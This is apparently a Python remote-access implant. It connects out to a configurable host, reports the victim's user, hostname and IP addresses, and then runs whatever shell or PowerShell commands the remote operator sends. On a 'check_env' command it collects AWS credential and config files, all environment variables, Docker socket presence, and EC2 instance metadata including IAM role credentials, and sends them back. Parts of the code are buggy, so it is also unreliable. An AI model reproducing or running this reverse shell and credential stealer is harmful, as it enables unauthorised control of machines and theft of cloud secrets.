import os
import socket
import sys
import subprocess
import platform
import requests
import psutil
import json
from multiprocessing import Process
import time
from subprocess import PIPE, Popen





global stop_thread

particles = {}

def init_info(system):
    if system == 'Linux':
        check_env = {}
        check_env["SYSTEM"] = system

        user = os.environ.get('USER')
        check_env['USER'] = user

        uname = os.uname()
        un = {}
        un['sysname'] = uname.sysname
        un['nodename'] = uname.nodename
        un['release'] = uname.release
        un['version'] = uname.version
        un['arch'] = uname.machine

        uname = json.dumps(un)
        check_env['UNAME'] = uname

        env = os.environ
        env_dict = {}
        for key, value in env.items():
            env_dict[key] = value
        check_env["ENV"] = env_dict

        proc = psutil.Process(1).name()
        check_env['INIT'] = proc

        if os.path.exists('/var/run/docker.sock'):
            docksock = True

        else:
            docksock = False

        check_env['DOCKSOCK'] = docksock

        hostname = platform.node()
        check_env['HOSTNAME'] = hostname

        home = os.environ.get('HOME')
        aws_creds = {}
        cred_array = []
        conf_array = []
        if os.path.exists("{}/.aws/credentials".format(home)) and os.path.exists("{}/.aws/config".format(home)):
            creds = open("{}/.aws/credentials".format(home), "r")
            for line in creds.readlines():
                cred_array.append(line.strip())

            config = open("{}/.aws/config".format(home), "r")
            for line in config.readlines():
                conf_array.append(line.strip())
            creds.close()
            config.close()

        print(cred_array)
        print(conf_array)

        i = 0
        while i < len(cred_array):
            print(i)
            if "[" in cred_array[i]:
                profile = ((cred_array[i]))[1:-1]
                if len(profile.split(" ")) == 1:
                    pass
                elif len(profile.split(" ")) == 1:
                    profile = ((cred_array[i]).split(" ")[1])
                if len(profile.split(" ")) == 0:
                    break

                aws_creds[profile] = {}
                aws_creds[profile]["AWS_KEY"] = ((cred_array[i+1]).split(" ")[2])
                aws_creds[profile]["SECRET_KEY"] = ((cred_array[i+2]).split(" ")[2])
                i+=3
                #if i >= len(conf_array):
                #    break

        i = 0
        while i < len(conf_array):
            print(i)
            if "[" in conf_array[i]:
                profile = ((cred_array[i]))[1:-1]
                if len(profile.split(" ")) == 1:
                    pass
                elif len(profile.split(" ")) == 1:
                    profile = ((cred_array[i]).split(" ")[1])
                if len(profile.split(" ")) == 0:
                    break

                aws_creds[profile]["region"] = ((conf_array[i+1]).split(" ")[2])
                i+=3
                #if i >= len(conf_array):
                #    break

        check_env['AWS_CREDS'] = aws_creds
        print(check_env)
        return check_env

def meta_data():
    metadata = {}
    metatest = {
        "user-data":"user-data",
        "ami-id":"meta-data/ami-id",
        "instance-id":"meta-data/instance-id",
        "instance-type":"meta-data/instance-type",
        "local-ipv4":"meta-data/local-ipv4",
        "local-hostname": "meta-data/local-hostname",
        "public-ipv4":"meta-data/public-ipv4",
        "public-hostname": "meta-data/public-hostname",
        "security-groups":"meta-data/security-groups",
        "reservation-id":"meta-data/reservation-id",
    }

    iam_metatest = {
        "iam-info": "meta-data/iam/info",
        "ec2-role": "meta-data/iam/security-credentials/",
    }

    adv_metatest = {
        "macs": "network/interfaces/macs",
        "interfaces": []
    }

    interfaces = {
        "interface-id":"interface-id",
        "local-hostname":"local-hostname",
        "local-ipv4s":"local-hostname",
        "public-hostname": "public-hostname",
        "public-ipv4s": "public-hostname",
        "security-groups": "security-groups",
        "security-group-ids": "security-group-ids",
        "subnet-ipv4-cidr-block": "subnet-ipv4-cidr-block",
        "vpc-id": "vpc-id",
        "vpc-ipv4-cidr-block": "vpc-ipv4-cidr-block",
        "vpc-ipv4-cidr-blocks": "vpc-ipv4-cidr-blocks",
    }

    metalink = "http://169.254.169.254/latest/"

    try:
        r = requests.get(metalink, timeout=5)

        if r.status_code == 200:
            metadata["status-code"] = r.status_code
            for key,value in metatest.items():
                meta_resp = requests.get("{}{}".format(metalink,value))
                metadata[key] = meta_resp.text

            iam_info = requests.get("{}{}".format(metalink, iam_metatest['iam-info'])).json()
            iam_arn = iam_info['InstanceProfileArn']
            ec2_role = requests.get("{}{}".format(metalink, iam_metatest['ec2-role'])).text
            iam_keys = requests.get("{}{}".format(metalink, iam_metatest['ec2-role'], ec2_role.text)).json()
            iam_keys['InstanceProfileArn'] = iam_arn

            metadata['iam'] = iam_keys

            ifs = {}
            metalink = metalink + "meta-data" + adv_metatest['macs']
            macs = requests.get("{}{}".format(metalink, adv_metatest['macs'])).json()
            for mac in macs:
                for key, value in interfaces.items():
                    meta_resp = requests.get("{}{}{}".format(metalink, mac, value))
                    ifs[mac] = meta_resp.text

            metadata['interfaces'] = ifs

        elif r.status_code == 401:
            try:
                headers = {"X-aws-ec2-metadata-token-ttl-seconds": '21600'}
                test_token = requests.put("http://169.254.169.254/latest/api/token", headers=headers, timout=5)
                TOKEN = test_token.text
                # TOKEN= `curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600"` \
                # && curl -H "X-aws-ec2-metadata-token: $TOKEN" -v http://169.254.169.254/latest/meta-data/
                metadata["status-code"] = 401
                headers = {"X-aws-ec2-metadata-token": TOKEN}
                metadata["status-code"] = test_token.status_code
                for key, value in metatest.items():
                    meta_resp = requests.get("{}{}".format(metalink, value), headers=headers, timeout=5)
                    metadata[key] = meta_resp.text

                iam_info = requests.get("{}{}".format(metalink, iam_metatest['iam-info']), headers=headers, timeout=5).json()
                iam_arn = iam_info['InstanceProfileArn']
                ec2_role = requests.get("{}{}".format(metalink, iam_metatest['ec2-role']), headers=headers, timeout=5).text
                iam_keys = requests.get("{}{}".format(metalink, iam_metatest['ec2-role'], ec2_role.text), headers=headers, timeout=5).json()
                iam_keys['InstanceProfileArn'] = iam_arn

                metadata['iam'] = iam_keys

                ifs = {}
                metalink = metalink + "meta-data" + adv_metatest['macs']
                macs = requests.get("{}{}".format(metalink, adv_metatest['macs']), headers=headers, timeout=5).json()
                for mac in macs:
                    for key, value in interfaces.items():
                        meta_resp = requests.get("{}{}{}".format(metalink, mac, value), headers=headers, timeout=5)
                        ifs[mac] = meta_resp.text
            except requests.exceptions.ConnectTimeout:
                metadata['status-code'] = 0

            metadata['interfaces'] = ifs
        else:
            metadata["status-code"] = r.status_code
    except requests.exceptions.ConnectTimeout:
        metadata['status-code'] = 0

    return metadata

def socket_create():
    global stop_thread
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((HOST, PORT))

        system = platform.system()

        if system == 'Linux' or system == 'Darwin':
            user = "{}".format(os.environ.get('USER'))

        elif system == 'Windows':
            user = "{}\\{}".format(os.environ.get('USERDOMAIN'), os.environ.get('USERNAME'))

        ip = ''
        ips = []
        ipss = []
        if system == 'Linux':
            hostname = os.environ.get('NAME')
            ip = os.popen('ip a').read()
            for x in ip.split("\n"):
                if "inet" in x:
                    if "127.0.0.1" in x or "::1" in x:
                        continue
                    else:
                        ips.append(x.split(" ")[5])
                        ips = ip.split("\n")
                        for x in ips:
                            if "IPv4 Address" in x:
                                a = ips.index(x)
                                ipss.append(x.split(":")[1] + "\t" + (ips[a + 1]).split(":")[1])

        elif system == 'Windows':
            hostname = os.environ.get('COMPUTERNAME')
            ip = os.popen('ipconfig').read()

        info = {}
        info['USER'] = user
        info['SYSTEM'] = system
        info['HOSTNAME'] = hostname
        info['LAN_IP'] = ipss

        dt = json.dumps(info)
        s.send(dt.encode())

        while True:
            data = s.recv(2048)
            if data.decode().strip() == 'quit' or data.decode().strip() == 'exit':
                stop_thread = False
                print("Ok")
                s.send('Ok'.encode())
                s.close()
                print("socket closed")
                #sys.exit()

            elif len(data.decode()) == 0:
                s.send(" ".encode())

            elif data.decode().strip() == 'check_env':
                check_env_data = init_info(system)
                metadata = meta_data()
                check_env_data['META-DATA'] = metadata
                check_env_data_str = json.dumps(check_env_data)
                print(check_env_data_str)
                s.send(check_env_data_str.encode())

            elif data.decode() == "":
                dt = ' '
                s.send(dt.encode())

            elif 'cd ' in data.decode():
                os.chdir((data.decode())[1:])

            elif (data.decode().strip()).split(" ")[0] == 'kill':
                if len((data.decode().strip()).split(" ")) == 1:
                    s.send("kill_error".encode())
                else:
                    Popen("kill " + (data.decode().strip()).split(" ")[1], shell=True, stdout=PIPE, stderr=PIPE)
                    s.send(("killed_{}".format((data.decode().strip()).split(" ")[1]).encode()))

            elif data.decode() == ' ':
                dt = ' '
                s.send(dt.encode())
            else:
                out = err = ""
                if system == 'Windows':
                    command = "powershell.exe " + data.decode()
                    p = Popen(command, shell=True, stdout=PIPE, stderr=PIPE)
                    out, err = p.communicate()
                elif system == 'Linux' or system == 'Darwin':
                    p = Popen(data.decode(), shell=True, stdout=PIPE, stderr=PIPE)
                    out, err = p.communicate()
                print(type(out))
                if out.decode() == '':
                    if err.decode() == '':
                        cout = ' '
                    else:
                        cout = err.decode()
                else:
                    cout = out.decode()
                s.send(cout.encode())
    except socket.error as e:
        print(e)

def threads():
    global stop_thread
    stop_thread = True
    th = []
    while True:
        thread = Process(target=socket_create)
        th.append(thread)
        thread.start()
        if not stop_thread:
            break
        time.sleep(SECONDS)

    for thread in th:
        thread.terminate()
        thread.join()

if __name__ == '__main__':
    if SECONDS == None:
        socket_create()

    else:
        threads()

